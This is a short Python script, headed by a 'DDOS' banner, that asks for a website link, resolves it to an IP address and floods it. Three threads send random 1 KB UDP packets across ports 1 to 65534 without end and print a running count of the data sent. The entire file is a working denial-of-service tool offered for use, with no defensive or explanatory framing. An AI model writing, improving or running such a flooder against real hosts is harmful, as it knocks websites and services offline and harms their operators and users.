import socket , random
import threading
from colorama import Fore
import os
os.system("clear")

banner = """
____  ____   ___  ____
|  _ \|  _ \ / _ \/ ___|
| | | | | | | | | \___ \
| |_| | |_| | |_| |___) |
|____/|____/ \___/|____/
"""
print(Fore.LIGHTRED_EX+banner)
print(Fore.LIGHTMAGENTA_EX+"Created By: MrDarkSmile GitHub")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = random._urandom(1024)

ok = 0
packet_size = len(data)
print(packet_size) #1024
link = str(input("enter link of site: "))
if "http://" in link:
  link = link.replace("http://","")
elif "https://" in link:
  link = link.replace("https://","")


ip = socket.gethostbyname(link)

#port = 80

run = True

def sender1(num,color):
  port = 80
  global ok
  while True:
    if run == True:
      sock.sendto(data , (ip,port)) #1KB
      port += 1
      if port == 65534:
        print(color+str(f"thread : {num}    packet : {ok/1024}MB"))
        ok += 65534
        port = 1
    else:break
      

def sender2(num,color):
  port = 65534
  global ok
  while True:
    if run == True:
      sock.sendto(data , (ip,port))
      port -= 1
      if port == 1:
        ok += 65534
        print(color+str(f"thread : {num}    number : {ok/1024}MB"))
        port = 65534
    else:break



t1 = threading.Thread(target=sender1,args=("1",Fore.RED))
t2 = threading.Thread(target=sender2,args=("2",Fore.GREEN))
t3 = threading.Thread(target=sender1,args=("3",Fore.MAGENTA))
t1.start();t2.start();t3.start();
t1.join()
t2.join()
t3.join()
